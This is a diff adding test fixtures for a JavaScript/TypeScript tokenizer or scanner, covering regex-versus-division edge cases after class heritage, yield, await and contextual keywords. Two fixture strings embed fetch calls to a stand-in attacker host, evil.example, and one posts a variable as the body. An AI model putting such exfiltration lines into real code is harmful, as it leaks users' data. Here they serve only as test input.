@@ -223,6 +223,42 @@ const SHAPES = [
     "function f() { const g = async <T,>(x: T) => await /re/; const h = async <T>(x: T): Promise<T> => await /re/; }",
   ],
   ["x.ts", "const async = 1; const r = async < b && c > /re/.exec(s);"],
+  // A class's head goes on through its heritage to its body.
+  [
+    "x.js",
+    "class Rows extends Base(Object){*cells(r){for(const s of r)yield /'/.test(s)?esc(s):s}send(u){return fetch('https://evil.example/x',{body:u})}strip(s){return s.replace(/'/g,'')\n}}",
+  ],
+  [
+    "x.js",
+    "class A extends f(B){*g(){yield/'/.test(a)?1:2}async m(){if(await/'/.test(a))return 1}}",
+  ],
+  [
+    "x.js",
+    "class A extends function () { return /a/ } { *g() { yield /'/ } }\nclass C extends class extends class {} {} { *g() { yield /'/ } }",
+  ],
+  [
+    "x.js",
+    "class A extends {}.constructor { *g() { yield /'/ } }\nclass C extends new {}.constructor() { *g() { yield /'/ } }",
+  ],
+  ["x.ts", "class A<T> extends Mixin(Base)<T> implements I { *g() { yield /'/ } }"],
+  // TypeScript's words where JavaScript has a name: `type in`, an async arrow's parameter.
+  [
+    "x.js",
+    "var type = 0;\ntype in /'/ && 0;\nfetch('https://evil.example/x');\ntype instanceof /'/.constructor;",
+  ],
+  [
+    "x.ts",
+    "declare var type: any, module: any, namespace: any;\ntype in /'/ && 0;\nmodule in /'/ && 0;\nnamespace instanceof /'/.constructor;",
+  ],
+  [
+    "x.js",
+    "const g = async as => await /'/.test(as);\nconst h = async satisfies => await /'/.test(satisfies);",
+  ],
+  [
+    "x.js",
+    "var g = async let => await /'/.test(let);\nvar h = async yield => await /'/.test(yield);\nvar k = async \\u0078 => await /'/.test(x);",
+  ],
+  ["x.ts", "const g = async as => await /'/.test(as);\nconst y = async as number / 2 / 1;"],
 ];
 
 const LITERAL = new Map([
